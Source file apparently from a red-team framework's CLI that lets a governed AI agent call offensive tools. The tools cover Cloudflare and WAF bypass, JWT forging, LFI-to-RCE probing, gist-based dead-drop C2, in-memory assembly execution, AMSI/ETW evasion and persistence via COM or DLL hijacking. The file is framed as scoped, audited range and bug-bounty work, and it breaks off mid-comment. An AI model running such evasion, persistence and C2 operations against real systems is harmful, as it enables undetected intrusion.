// VARVEL — the native-tool CLI: every reviewed tool, callable as one command.
//
// Why this exists: the governed chat agent was hand-rolling throwaway Python for jobs we
// have TESTED native tools for (the k2.7 run wrote six scripts to do what jwtforge +
// chainrun now do natively). The CLI puts the reviewed toolset on the agent's PATH as
// single commands — JSON in (where applicable), JSON out. Same governance as always:
// the calls are Bash commands, so the Enclave hook gates every one (scope, DLP, audit),
// and the tools keep their own honesty contracts (content-verified, budget-capped,
// stealth-paced).
//
//   node tools/cli.mjs crawl      <baseUrl> [maxPages]
//   node tools/cli.mjs apisurface <baseUrl>
//   node tools/cli.mjs vulncheck  <baseUrl>
//   node tools/cli.mjs ssrf       '<endpoint with {URL}>'
//   node tools/cli.mjs jwt-decode <token>
//   node tools/cli.mjs jwt-forge  '<claimsJson>' <key>
//   node tools/cli.mjs jwt-verify <token> <key>
//   node tools/cli.mjs chainrun   <chainFile.json>
//   node tools/cli.mjs posture    <baseUrl> [benchmark]

import { crawl } from './crawl.mjs';
import { apiSurface } from './apisurface.mjs';
import { vulnCheck } from './vulncheck.mjs';
import { ssrfProbe } from './ssrfprobe.mjs';
import { decodeJwt, signHs256, verifyHs256 } from './jwtforge.mjs';
import { runChain } from './chainrun.mjs';
import { chainforge } from '../engine/chainforge.mjs';
import { fuzz } from './fuzz.mjs';
import { smbNegotiate } from './smbenum.mjs';
import { osFingerprint } from './osfp.mjs';
import { canaryScan } from './canary.mjs';
import { ldapEnum } from './ldapenum.mjs';
import { recordDefense, createTwin, fidelityCheck } from '../engine/twinforge.mjs';
import { recordDetoracleVerdict, recordShapegradeScore } from '../engine/oraclelog.mjs';
import { Settings } from '../engine/settings.mjs';
import { readOperator, scopeForCampaign } from '../engine/identity.mjs';
import { readFileSync, writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

// Full-body-first channel tasker (the evasion/persist pattern, factored once for the
// range-monitoring tools): posture/event evidence never fits the 120-char ledger
// preview — drain THIS task's result from /api/channel/results, fall back to the
// ledger preview honestly. null = tasking refused or agent gone (callers fail closed).
function mkChannelTasker(api, polls = 60) {
  return async (agentId, kind, data) => {
    const r = await (await fetch(api + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId, kind, data }) })).json();
    if (!r || !r.taskId) return null;
    for (let i = 0; i < polls; i++) {
      await new Promise((res) => setTimeout(res, 2000));
      const full = await (await fetch(api + '/api/channel/results?agent=' + agentId + '&taskId=' + r.taskId)).json().catch(() => null);
      if (full && Array.isArray(full.results) && full.results.length) return String(full.results[0].data ?? '');
      const { tasks } = await (await fetch(api + '/api/channel/tasks?agent=' + agentId)).json();
      const x = (tasks || []).find((y) => y.taskId === r.taskId);
      if (x && x.status === 'resulted') return x.resultPreview || '';
    }
    return null;
  };
}

// Journal files (the rangehard reversibility trail) live under repo-local .tmp —
// the house rule for operator artifacts (gitignored, Defender-excluded).
const JOURNAL_DIR = join(dirname(fileURLToPath(import.meta.url)), '..', '.tmp', 'rangehard');

const [,, cmd, ...args] = process.argv;

// Ghost settings for the clearance family (mint + rides): the SAME per-engagement
// Settings source the ghost engine arms from (wafbypass/lfichain read it identically),
// so the mint egress decision can never drift from what the governed tools ride.
// Never throws -- an unreadable store reads as ghost off (the fail-closed mint refusal
// for 'required' lives in resolveMintEgress, driven by what IS readable).
function ghostSettings(engagement) {
  try {
    const s = Settings.for(engagement);
    return { ghostMode: s.get('ghost.mode'), ghostChain: s.get('ghost.chain') };
  } catch { return { ghostMode: 'off', ghostChain: '' }; }
}

// Armed-engagement resolution (2026-08-12, the live operator-miss fix): the clearance
// family resolves its engagement bucket in the same order the governed CLI does —
//   1. the explicit --engagement flag (handled at the call site; it always wins)
//   2. the ARMED engagement: VARVEL_ENGAGEMENT, else the signed Enclave session's
//      workspace — the very source the server arms OPERATOR_SCOPE.engagement from
//      (identity.scopeForCampaign, so an unverified/forged session arms nothing)
//   3. nothing armed anywhere -> undefined -> the legacy 'default' settings bucket
//      (the pre-fix behavior); the result then NAMES the bucket used (no silent guess).
// Never throws: an absent/unreadable session simply means nothing is armed.
async function armedEngagement(env = process.env) {
  if (env.VARVEL_ENGAGEMENT) return env.VARVEL_ENGAGEMENT;
  try {
    const scope = scopeForCampaign(await readOperator(env));
    return scope ? scope.engagement : undefined;
  } catch { return undefined; }
}

// Oracle persistence glue (the training-data flywheel, engine/oraclelog.mjs): every
// detoracle verdict lands on disk append-only with its agent + engagement context. A
// persistence failure NEVER breaks the tool run — it rides the result object as
// persistence:{ok:false,...}, honestly named.
function persistDetoracle(verdict, { agentId, op, engagement } = {}) {
  if (!verdict || typeof verdict !== 'object') return verdict;
  const persistence = recordDetoracleVerdict({ agentId, op, engagement: engagement || null, verdict });
  return { ...verdict, persistence };
}

const USAGE = `varvel-tool — native, governed, content-verified
  ghost [api]                      Ghost Mode self-check via the server (fresh verify + posture) — run FIRST, never raw-curl the proxy/IP-echo
  cfcheck <url>                    classify ONE response's challenge posture (managed-js/turnstile/1020/rate-limit/labyrinth/none + evidence)
  cfmap <baseUrl> [pathsCsv]       paced per-path challenge posture map (unchallenged paths = findings; labyrinth stops the map)
  originintel <domain> [verify --scope cidrCsv]  origin discovery v2 (crt.sh + history + SPF + favicon-hash vs live CF ranges) — verify probes ONLY in-scope candidates; out-of-scope is refused with the exact /32 to ask signed in
  wafbypass --url <u> --param <p> --class lfi|sqli|xss --marker <re> [--scope cidrCsv]  WAF-bypass mutation engine (marker-verified, stability-checked, ghost-ridden, scope-gated)
  lfichain <probe|read|rce-oracle|sesscheck> --url <u> --scope <cidrCsv>  LFI toolkit for the CVE-2025-4524 class (read-only-first; rce-oracle is --operator-confirm gated)
  egressbench <url> [n] [egresses] measured challenge rate per egress (zone+time stamped; a measurement, never a claim)
  cfetch <url> [proxy]             browser TLS/H2 fingerprint-parity fetch via curl-impersonate (honest unsupported state on this host)
  cfride <url> [tool] [maxPages] [--engagement <id>]   ride vaulted clearance through crawl/apisurface/vulncheck/raw (exact UA+cookie, human-paced, proof-gated; raw [jsonOpts] [--full-body] returns the UNCAPPED body for evidence pulls; engagement defaults to the armed one)
  sessride <url> --jar <f> --scope <cidrCsv>  governed session ride: vaulted cf_clearance + authenticated cookie jar in ONE request path (GET/POST; --authcheck grades auth state as EVIDENCE; cross-host redirects never followed with the session)
  rendercheck <url> --scope <cidrCsv> [--expect <t|re:..>] [--deny <t|re:..>] [--out <png>] [--jar <f>] [--no-ride]  VISUAL change confirmation: REAL headless browser render (nodriver sidecar) riding the clearance+chain; cache-aware verdict (origin-live vs cached-copy -- a change behind a HIT is real-but-cloaked); screenshot to evidence dir
  cfbrowser <action> <url> [json]  browser INTERACTION as the vaulted identity (open/forms/fill-submit/probe-comment; visible window; operator ticks)
  clearance mint <url> [engine]|status   stealth-browser cf_clearance mint (VISIBLE Chrome window; proven before vaulted; engine = nodriver|patchright|auto, default auto; ghost armed => mints THROUGH the chain, required+no-chain refuses, --direct-egress overrides WITH warning) / vault status
  crawl <baseUrl> [maxPages]       BFS the site's own links/forms into endpoints+params+tech
  apisurface <baseUrl>             robots/sitemap/OpenAPI/GraphQL/JS surface mining
  vulncheck <baseUrl>              curated confirmed-exposure + header/cookie/CORS checks
  ssrf '<endpoint {URL}>'          SSRF probe pack (baseline+control honest diff)
  jwt-decode <token>               inspect a JWT (claims, alg, red flags)
  jwt-forge '<claimsJson>' <key>   mint an HS256 token with a RECOVERED key
  jwt-verify <token> <key>         confirm a key validates a token (timing-safe)
  chainrun <chainFile.json>        replay a documented exploit chain with evidence
  floworacle <agentId>|profile     flow-beacon self-test: live agent flow, or pre-flight a cadence profile
  shape <agentId> [profile] [api]  apply a wire-shape profile (plain|cdn-asset|software-update|telemetry-beacon); omitted = engagement shape.* settings floor (batch/dwell + padding overrides included)
  shapegrade <agentId>|profiles    oracle-graded self-measurement: the APPLIED shape vs the measured wire (JA4H + cadence) — divergence reported loudly, never asserted away
  failover <agentId> [apply] [api] oracle-graded adaptive failover: per-wire ranking (delivery health + measured beacon score + success history; pin wins); 'apply' issues the recommended audited switch
  tradecraft <agentId>|check       AI-agent signature grading: live stream, or pre-flight a planned command list
  fporacle ja4s|http               fingerprint self-awareness: probe a TLS server, or read the channel's JA4H ring
  pivots [api]                     pivot-mesh view: SMB-link (piped) agents grouped by parent+link, off /api/channel
  ghc2 <arm|status|poll|detach> [api]   cloud/SaaS dead-drop C2 (GitHub gist mailbox): arm reads ghc2.* settings (default-OFF; burner PAT, never the operator's), checks the FREE /rate_limit budget, threads the ghost chain; poll = one manual mailbox cycle
  preflight [host] [ports]         defender-view scan of OUR OWN infrastructure (cert/JA4S/JARM/banners/egress)
  rangehard audit|apply|revert <agentId> [journalFile] [api]   range Defender baseline vs the DEFAULT-HARD model: read-only gap audit; operator-invoked apply (journaled before/after + revert commands to .tmp/rangehard/, refuses an unreachable/unreadable range); journal replay revert. Tamper protection = MANUAL gap, by design
  edrview <agentId> [command|--collect] [markersCsv] [api] [--since iso]   EDR self-view: what the range's telemetry RECORDED about our action (Defender/Operational, Sysmon if installed, Security logon/share) — recorded (IDs cited) / clean-in-telemetry ("no record found in X logs", never 'undetected') / telemetry-absent
  detoracle <agentId> <command> [api]   detection oracle: snapshot → probe → verdict (clean/detected/blocked/unmonitored — 'clean' is never a claim)
  detoracle calibrate <agentId> [api] [--offline]   EICAR calibration gate: benign must read clean AND EICAR must fire, else the baseline is stamped UNCALIBRATED (baselineTrusted:false) — harden first with rangehard. --offline = sealed-net control: on-demand MpCmdRun conviction from local signatures is the PRIMARY lane; the on-access write lane is reported separately (it needs cloud reachability — measured 2026-08-24), never merged
  posture <baseUrl> [benchmark]    0-100 defensive-posture scorecard vs real references
  state [hosts|findings|creds|sessions] [--engagement <id>] [--json]  external state store: counts by kind, or a REDACTED entity listing (secrets never print)
  state cred <key> --reveal        print ONE cred's secret to stdout, once (operator-side only — never in briefs/reports/API)
  state note <text>                append an operator note to the engagement state store
  missions                         list checkpointed missions (id, status, turns, retries, objective) — session resilience
  resume <missionId> [instruction] [--brain openai-compatible [--brain-url u] [--brain-model m] [--brain-key-env name]]   reconstruct a checkpointed/crashed mission and CONTINUE it (governed; ledgered tool calls are never re-fired; --brain resumes onto the local-brain provider — engine/brain-provider.mjs layers supply what the flags omit)
  split <missionId> [note]         summarize the mission into a structured handoff (failed hypotheses SURVIVE) + seed a fresh mission
  privemap <source-dir> [--top N] [--json]  static privesc/impact-primitive miner for a local WordPress plugin/theme PHP tree (ranked candidate list; read-only probes only)
  reachprove <source-dir> [--entry <file:line|hook>] [--rescore <privemap.json|->] [--top N] [--json]  MECHANICAL reachability adjudication for WP entry points, before any AI burns a token: parses add_action/add_shortcode/register_rest_route/wp_register_ability, resolves callbacks, reads in-handler + permission_callback gates, and emits UNAUTH|SUBSCRIBER|CONTRIBUTOR|AUTHOR|EDITOR|ADMIN|SERVER|UNKNOWN with the file:line evidence chain. --rescore re-grades a privemap report (CONFIRMED|DEGRADED|KILLED|UNCERTAIN + penalized re-rank; pipe via --rescore - : privemap <dir> --json | reachprove <dir> --rescore -). Limits: line heuristics not an AST; dynamic hook names / variable callbacks / out-of-tree definitions report UNKNOWN by design, never a fabricated floor
  variantsweep <source-dir> --sig <sig.json|'<inline-json>'> [--top N] [--json]  variant sweep: given a vuln SIGNATURE (pattern: sink-line regex + context anchors | class: a named privemap sink class), sweep a local WP-plugin corpus for OTHER carriers — two-stage (regex prefilter, privemap confirm); hits ranked with a BLANK status field (novelty is the operator's call, never a CVE claim)
  goldenbench [--manifest <path>] [--json]   golden-plugin recall/precision GATE for privemap (research §6 item 9 — run before/after EVERY privemap rule change): must-hit pins must land at/above their expected reachability (a MISS names the ref, FAILs the bench, exit 2); must-stay-clean plugins must yield zero CONFIRMED-band unauth candidates (sub-band counts recorded honestly); corpus-absent entries SKIP with a named reason, never fail
  jsmap <source-dir> [--top N] [--json]     the privemap method for Node/JS source: express/koa routes + raw http servers mined for rce/eval/proto-pollution/traversal/jwt/ssrf/deser sinks + differential auth-middleware gaps (ranked; read-only probes only)
  pocdoc <finding.json> [--rank N] [--software <name>] [--slug <s>] [--versions <range>] [--researcher <h>] [--out <md>]  fill the Wordfence CNA submission template from a validated miner candidate (a candidate JSON, or a full privemap/jsmap report + --rank); unknown fields are TODO(validate), never fabricated
  program import <fixture.json> --platform hackerone|bugcrowd|generic [--principal <p>] [--workspace <w>] [--out scope.json] [--sign]   bug-bounty scope intake: normalize a program's PUBLISHED scope into the signed-scope fixture format (offline by doctrine — domains carried with the resolution gap named; out-of-scope ALWAYS wins on overlap; --sign reuses the seam's own signSession and self-verifies before any write)
  bountyreport <findings.json> [--platform hackerone|bugcrowd|generic] [--ref <ref>] [--index N] [--researcher <h>] [--out report.md]   a VARVEL findings JSON (surface / tool-result / array / single) -> submission-ready bounty markdown; evidence verbatim-minus-redactions (the cookie-never-reaches-report doctrine); honesty footer lists every unverified gap; readiness COMPUTED from the validator gate
  bountyline <add|list|show|run|triage|draft|queue|mark|ledger> …   the autonomous bounty pipeline (engine/bountyline.mjs): add <intakeRecord.json> [--scope s.json] [--automation full|human-cadence|prohibited] (policy text decides, DEFAULT prohibited); run <id> [--scope s.json] [--campaign a.json] [--report r.md] = the automation gate as code (prohibited REFUSES naming the policy; human-cadence forces the conservative cadence map; no signed scope = refusal); triage/draft/queue move hunted -> QUEUED-FOR-SEND (one bountyreport per ready finding + a submission checklist — THE PIPELINE NEVER SUBMITS: no network submission code path exists, not behind any flag); mark <id> submitted|duplicate|informative|resolved|paid [--amount N --currency GBP] books the ledger; ledger prints totals per currency + the £3332.50 goal line (GBP only — never converted)
  h1watch <scan|report|show> …   the bounty pipeline's EYES (tools/h1watch.mjs): scan [--fixture f] [--emit-intake] [--outbox d] [--base u] diffs HackerOne's directory + structured scopes against recorded state (live needs the credential in env VARVEL_H1_TOKEN — the NAME only; --fixture is the SAME code offline; no token = loud refusal, never fabricated data); report [--all] ranks the fresh ground (new bountied programs first, then scope-added on bountied); show <handle> prints one record. NEVER signs, NEVER runs — outbox files are operator-REVIEWABLE intake for program import / bountyline add
  commitwatch <scan|report|show|targets> …   the vuln-discovery layer's EYES on wordpress.org (tools/commitwatch.mjs + engine/commitwatch.mjs): scan --fixture f | scan --live [--targets t.json] diffs tracked plugins' SVN trunk changesets against the recorded last-seen revision and ranks REVIEW-ONLY leads (a commit ADDING a nonce/capability/sanitization check names the vuln class + the affected older versions + the sibling-hunt seed). Live is GATED: --live required, wordpress.org hosts only, read-only GETs; --fixture is the SAME code offline. report [--all] ranks leads (high band first); show <slug> prints one record; targets lists the data-driven watch set (data/commitwatch/targets.json). NEVER hunts, NEVER submits — suggested-seeds are fed to variantsweep/privemap BY HAND
  attackbench <report|layer|map> …   the ATT&CK coverage benchmark harness (engine/attackbench.mjs + tools/attackbench.mjs; data data/attackbench/): report measures the LOCAL priority catalog (24 ids from the validation doc's §2.5 matrix) against the code-grounded capability map — mapped vs planned-only vs GAP, per-tactic rollup, gap list with priority basis; layer exports the Navigator-compatible layer JSON ([--out f]); map prints the validated capability map. HONESTY GATE: an 'exists' entry whose module is not on disk fails loudly; 'planned' claims no code. ZERO network (no STIX/TAXII); [--catalog f] [--map f] override the data files. Capability, never detection — NOT MITRE-affiliated, never 'MITRE-tested'
  remediate list|draft <ref>|verify <id>|open-pr <id>|mark <id> merged|rejected   auto-remediation PR loop (VALIDATED findings only; default-OFF gates remediate.prEnabled + remediate.remoteAllow; burner PAT via secret remediate.ghToken; open-pr is the ONLY push/open path — HITL)`;

async function main() {
  switch (cmd) {
    case 'crawl': {
      if (!args[0]) throw new Error('crawl needs <baseUrl>');
      const r = await crawl(args[0], { maxPages: Number(args[1]) || undefined });
      return { endpoints: r.endpoints, params: r.params, forms: r.forms, tech: r.tech, findings: r.findings, pages: r.pages.length, requests: r.requests };
    }
    case 'apisurface': {
      if (!args[0]) throw new Error('apisurface needs <baseUrl>');
      return await apiSurface(args[0]);
    }
    case 'vulncheck': {
      if (!args[0]) throw new Error('vulncheck needs <baseUrl>');
      return await vulnCheck(args[0]);
    }
    case 'ssrf': {
      if (!args[0]) throw new Error('ssrf needs an endpoint containing {URL}');
      return await ssrfProbe(args[0]);
    }
    case 'jwt-decode': {
      if (!args[0]) throw new Error('jwt-decode needs <token>');
      return decodeJwt(args[0]);
    }
    case 'jwt-forge': {
      if (!args[0] || !args[1]) throw new Error("jwt-forge needs '<claimsJson>' <key> — a key you RECOVERED (no brute force here)");
      const claims = JSON.parse(args[0]);
      return { token: signHs256(claims, args[1]) };
    }
    case 'jwt-verify': {
      if (!args[0] || !args[1]) throw new Error('jwt-verify needs <token> <key>');
      return { valid: verifyHs256(args[0], args[1]) };
    }
    case 'chainrun': {
      if (!args[0]) throw new Error('chainrun needs <chainFile.json>');
      const chain = JSON.parse(readFileSync(args[0], 'utf8'));
      return await runChain(chain);
    }
    case 'fuzz': {
      if (!args[0]) throw new Error('fuzz needs an endpoint containing {FUZZ}');
      return await fuzz(args[0]);
    }
    case 'smb': {
      if (!args[0]) throw new Error('smb needs <host> [port]');
      const r = await smbNegotiate(args[0], { port: Number(args[1]) || 445 });
      return { ...r, systemTime: String(r.systemTime), serverStartTime: String(r.serverStartTime) };
    }
    case 'osfp': {
      if (!args[0]) throw new Error('osfp needs <host> — OS fingerprint (SMB dialect + banners + optional TTL)');
      const signals = args[1] ? args[1].split(',') : undefined;
      return await osFingerprint(args[0], { signals });
    }
    case 'canary': {
      if (!args[0]) throw new Error("canary needs '<json>' — { target, dnsData?, paths?, shares?, customPatterns? } (deception suspicion scan)");
      return await canaryScan(JSON.parse(args[0]));
    }
    case 'detoracle': {
      // Structured "did the defender see it?" over the live channel: snapshot → probe →
      // verdict (clean/detected/blocked/unmonitored — 'clean' is never a claim).
      // Sub-op 'calibrate': THE EICAR CALIBRATION GATE (field finding 2026-08 — the
      // range's customized-soft Defender did not flag a byte-perfect EICAR file):
      // benign must read clean AND EICAR must read detected/blocked, else the oracle
      // refuses to call this baseline a trustworthy grading sensor.
      if (args[0] === 'calibrate') {
        // --offline (opt-in, 2026-08-25 — the sealed-net finding): current Defender does
        // NOT convict an EICAR write via on-access RTP without cloud reachability, but
        // on-demand MpCmdRun custom scan DOES convict from local signatures. Offline mode
        // makes the on-demand scan the PRIMARY control and reports the on-access write
        // lane separately (convicted|silent|unproven-offline) — channels never merge,
        // carrier failures read 'unknown', never 'clean'.
        const offline = args.includes('--offline');
        const pos = args.slice(1).filter((a) => a !== '--offline');
        if (!pos[0]) throw new Error("detoracle calibrate needs <agentId> [api] [--offline] — prove the range's Defender is a trustworthy grading sensor (EICAR control; --offline = the sealed-net on-demand control)");
        const { calibrate } = await import('../tools/detoracle.mjs');
        const api = pos[1] || 'http://127.0.0.1:8971';
        // detoracle.calibrate's taskAgent is the 2-ARG shell-command contract
        // (taskAgent(agentId, command)); mkChannelTasker is the 3-arg (agentId, kind,
        // data) shape. Passing it raw queued kind='<the whole command>' — the agent
        // answered 'unknown task kind', every snapshot parsed null, and the gate
        // failed CLOSED on a healthy sensor (measured live on the range 2026-08-24).
        const shellTasker = mkChannelTasker(api, 30);
        // Detached EICAR drop carrier (range day #2 finding): the inline drop wedges
        // the stale image agent when the sensor FIRES (the blocked child holds the
        // agent's pipe). Stage the dropper + WMI-detached launch instead; the gate
        // logic is unchanged, and carrier failures read 'unknown', never 'clean'.
        const stageFile = async (id, name, buf) => {
          const r = await (await fetch(api + '/api/channel/stage', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: id, name, b64: Buffer.from(buf).toString('base64') }) })).json();
          if (!r || !r.taskId) return 'stage refused: ' + JSON.stringify(r);
          for (let i = 0; i < 30; i++) {
            await new Promise((res) => setTimeout(res, 2000));
            const full = await (await fetch(api + '/api/channel/results?agent=' + id + '&taskId=' + r.taskId)).json().catch(() => null);
            if (full && Array.isArray(full.results) && full.results.length) return String(full.results[0].data ?? '');
          }
          return null;
        };
        return persistDetoracle(await calibrate({ taskAgent: (id, command) => shellTasker(id, 'shell', command), agentId: pos[0], stageFile, offlineControl: offline }), { agentId: pos[0], op: 'calibrate', engagement: await armedEngagement() });
      }
      if (!args[0] || !args[1]) throw new Error("detoracle needs <agentId> <command> [api] | calibrate <agentId> [api] — grade a command's detectability on a live channel agent");
      const { assess } = await import('../tools/detoracle.mjs');
      const api = args[2] || 'http://127.0.0.1:8971';
      const taskAgent = async (agentId, data) => {
        const t = await (await fetch(api + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId, kind: 'shell', data }) })).json();
        for (let i = 0; i < 30; i++) {
          await new Promise((r) => setTimeout(r, 2000));
          const { tasks } = await (await fetch(api + '/api/channel/tasks?agent=' + agentId)).json();
          const x = (tasks || []).find((y) => y.taskId === t.taskId);
          if (x && x.status === 'resulted') return x.resultPreview || '';
        }
        return null;
      };
      return persistDetoracle(await assess({ taskAgent, agentId: args[0], command: args[1] }), { agentId: args[0], op: 'assess', engagement: await armedEngagement() });
    }
    case 'rangehard': {
      // RANGE BASELINE HARDENING (field finding 2026-08): the range's Defender proved
      // CUSTOMIZED SOFT — evasion graded against a neutered baseline proves nothing.
      // Sub-ops (all ride the governed channel; audit/revert reads are read-only):
      //   audit  <agentId> [api]                 -> posture gap report vs the default-hard baseline
      //   apply  <agentId> [api]                 -> RESTORE the baseline (operator-invoked ONLY,
      //                                             never automatic); every change journaled
      //                                             (before/after + revert command) to .tmp/rangehard/
      //   revert <agentId> <journalFile> [api]   -> replay a journal backwards, then re-audit
      // apply REFUSES when the range is unreachable/unreadable — it never touches a
      // sensor it cannot read. Tamper protection is a MANUAL gap by design.
      const sub = args[0];
      if (!sub || !args[1]) throw new Error('rangehard needs <audit|apply|revert> <agentId> [journalFile] [api] — range Defender baseline audit/harden/revert over the governed channel');
      const { auditRange, applyHardening, revertHardening } = await import('../tools/rangehard.mjs');
      if (sub === 'audit') {
        const api = args[2] || 'http://127.0.0.1:8971';
        return await auditRange({ taskAgent: mkChannelTasker(api), agentId: args[1] });
      }
      if (sub === 'apply') {
        const api = args[2] || 'http://127.0.0.1:8971';
        const r = await applyHardening({ taskAgent: mkChannelTasker(api), agentId: args[1] });
        let journalFile = null;
        if (r.journal && r.journal.entries.length) {
          mkdirSync(JOURNAL_DIR, { recursive: true });
          journalFile = join(JOURNAL_DIR, 'journal-' + r.journal.at.replace(/[:.]/g, '-') + '.json');
          writeFileSync(journalFile, JSON.stringify(r.journal, null, 2));
        }
        return { ...r, journalFile, revertHint: journalFile ? `revert with: rangehard revert ${args[1]} ${journalFile}` : null };
      }
      if (sub === 'revert') {
        if (!args[2]) throw new Error('rangehard revert needs <agentId> <journalFile> [api] — the journal IS the reversibility contract');
        const journal = JSON.parse(readFileSync(args[2], 'utf8'));
        const api = args[3] || 'http://127.0.0.1:8971';
        return await revertHardening({ taskAgent: mkChannelTasker(api), agentId: args[1], journal });
      }
      throw new Error("rangehard: unknown sub-op '" + sub + "' (want audit|apply|revert)");
    }
    case 'edrview': {
      // THE EDR SELF-VIEW TIER: after a probe/action on the range, read what the
      // defender's TELEMETRY RECORDED about it — Defender/Operational (detections,
      // behavior blocks, config changes), Sysmon/Operational IF installed
      // (process-create/network-connect/image-load), Security logon/share events.
      // Read-only Get-WinEvent over the governed channel; correlation by time-window
      // + markers, never guesswork. Verdicts: 'recorded' (event IDs cited),
      // 'clean-in-telemetry' ("no record found in X logs" — NEVER 'undetected'),
      // 'telemetry-absent' (says WHAT could not be checked).
      //   edrview <agentId> [command|--collect] [markersCsv] [api] [--since iso]
      if (!args[0]) throw new Error('edrview needs <agentId> [command|--collect] [markersCsv] [api] [--since iso] — the defender-visible record of an action on the range');
      const { assessEdrView } = await import('../tools/edrview.mjs');
      const pos = [];
      let since = null;
      for (let i = 1; i < args.length; i++) {
        if (args[i] === '--since') { since = args[i + 1] || null; i++; continue; }
        pos.push(args[i]);
      }
      const command = pos[0] && pos[0] !== '--collect' ? pos[0] : null;
      const markersCsv = pos[1] || null;
      const api = pos[2] || 'http://127.0.0.1:8971';
      const markers = (markersCsv || 'agentbox,varvel-agent').split(',').map((s) => s.trim()).filter(Boolean);
      return await assessEdrView({ taskAgent: mkChannelTasker(api), agentId: args[0], command, markers, since });
    }
    case 'exec-assembly': {
      // THE SIGNATURE MOVE: execute a .NET assembly IN THE AGENT'S OWN MEMORY, then let
      // the detoracle grade what the defender saw. Capability + measured detectability.
      // The assembly file is read on the OPERATOR's box; only bytes ride the wire (the
      // target side never touches disk). Gated: the engagement needs exec.inMemory on
      // (POST /api/settings) AND the agent needs its in-memory flag — refusals surface
      // as refused:true, verdict 'unknown' (the gate working is not a clean verdict).
      if (!args[0] || !args[1]) throw new Error("exec-assembly needs <agentId> <assemblyFile> [argsCsv] [api] — in-memory .NET execution + detoracle verdict on a live channel agent");
      const { assessInlineExec } = await import('../tools/execasm.mjs');
      const bytes = readFileSync(args[1]);
      const spec = { assemblyB64: bytes.toString('base64'), args: args[2] ? args[2].split(',').filter((s) => s.length) : [] };
      const api = args[3] || 'http://127.0.0.1:8971';
      const taskAgent = async (agentId, kind, data) => {
        const r = await (await fetch(api + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId, kind, data }) })).json();
        if (!r || !r.taskId) return 'TASKING REFUSED: ' + ((r && r.error) || 'no taskId (unknown/killed agent)');
        for (let i = 0; i < 60; i++) { // inline execution can outlast a shell snapshot — 2 min patience
          await new Promise((res) => setTimeout(res, 2000));
          const { tasks } = await (await fetch(api + '/api/channel/tasks?agent=' + agentId)).json();
          const x = (tasks || []).find((y) => y.taskId === r.taskId);
          if (x && x.status === 'resulted') return x.resultPreview || '';
        }
        return null;
      };
      return await assessInlineExec({ taskAgent, agentId: args[0], spec });
    }
    case 'evasion': {
      // EVASION INTERNALS TIER (stage 1, doctrine 2026-08-12): governed own-process
      // AMSI/ETW neutralization on a live channel agent. Sub-ops:
      //   enable <agentId> <techniquesCsv> [api]            -> task evasion-enable
      //   restore <agentId> [techniquesCsv] [api]           -> task evasion-restore
      //   status <agentId> [api]                            -> task evasion-status
      //   cycle <agentId> <techniquesCsv> [probeCmd] [api]  -> THE SIGNATURE LOOP:
      //     enable -> verify -> detoracle probe -> restore -> verify restored
      //     (tools/evasion.mjs). A verdict measured under an active patch is phrased
      //     'monitoring neutralized (self-reported, patch-verified)' — NEVER 'clean'.
      // Gated exactly like exec-assembly: engagement exec.evasion (default OFF) AND the
      // agent's own evasion flag — refusals surface loud, never as a measurement.
      const sub = args[0];
      if (!sub || !args[1]) throw new Error("evasion needs <enable|restore|status|cycle> <agentId> [techniquesCsv] [probeCmd] [api] — governed own-process evasion on a live channel agent");
      const { assessEvasion } = await import('../tools/evasion.mjs');
      // Full-body first (the evasion evidence JSON never fits the 120-char ledger
      // preview): drain THIS task's result from /api/channel/results; fall back to the
      // ledger preview honestly when the body isn't there yet/anymore.
      const mkTasker = (api) => async (agentId, kind, data) => {
        const r = await (await fetch(api + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId, kind, data }) })).json();
        if (!r || !r.taskId) return 'TASKING REFUSED: ' + ((r && r.error) || 'no taskId (unknown/killed agent)');
        for (let i = 0; i < 60; i++) { // patching + verification scans can outlast a shell — 2 min patience
          await new Promise((res) => setTimeout(res, 2000));
          const full = await (await fetch(api + '/api/channel/results?agent=' + agentId + '&taskId=' + r.taskId)).json().catch(() => null);
          if (full && Array.isArray(full.results) && full.results.length) return String(full.results[0].data ?? '');
          const { tasks } = await (await fetch(api + '/api/channel/tasks?agent=' + agentId)).json();
          const x = (tasks || []).find((y) => y.taskId === r.taskId);
          if (x && x.status === 'resulted') return x.resultPreview || '';
        }
        return null;
      };
      if (sub === 'cycle') {
        if (!args[2]) throw new Error("evasion cycle needs <agentId> <techniquesCsv> [probeCmd] [api]");
        const api = args[4] || 'http://127.0.0.1:8971';
        return await assessEvasion({ taskAgent: mkTasker(api), agentId: args[1], techniques: args[2].split(',').map((s) => s.trim()).filter(Boolean), probeCommand: args[3] || null });
      }
      // single-op sub-commands: task the kind directly, return the raw result preview
      const kindMap = { enable: 'evasion-enable', restore: 'evasion-restore', status: 'evasion-status' };
      const kind = kindMap[sub];
      if (!kind) throw new Error("evasion: unknown sub-op '" + sub + "' (want enable|restore|status|cycle)");
      const isStatus = sub === 'status';
      const techCsv = isStatus ? '' : (args[2] || '');
      const api = (isStatus ? args[2] : args[3]) || 'http://127.0.0.1:8971';
      const data = isStatus ? '{}' : (techCsv ? JSON.stringify({ techniques: techCsv.split(',').map((s) => s.trim()).filter(Boolean) }) : (sub === 'restore' ? '' : (() => { throw new Error('evasion enable needs <techniquesCsv> e.g. amsi,etw'); })()));
      const preview = await mkTasker(api)(args[1], kind, data);
      return { kind, agentId: args[1], result: preview };
    }
    case 'persist': {
      // GOVERNED PERSISTENCE TIER (roadmap #8): cleanup-proof user-land persistence on a
      // live channel agent. Sub-ops:
      //   install <agentId> <techniquesCsv|jsonSpec> [name] [api] -> task persist-install
      //     (a jsonSpec starting '{' rides verbatim — the deep techniques' shape:
      //      {"techniques":["comhijack"],"deep":{"clsid":"{GUID}","dll":"C:\\...\\p.dll"}}
      //      {"techniques":["dllsearch"],"deep":{"host":"C:\\...\\h.exe","as":"apphelp.dll","dll":"C:\\...\\p.dll","trigger":"runkey"}})
      //   remove <agentId> <techniquesCsv|all> [api]          -> task persist-remove
      //   status <agentId> [techniquesCsv|jsonSpec] [api]     -> task persist-status
      //     (a jsonSpec may add "prove":true — the benign comhijack resolve-proof)
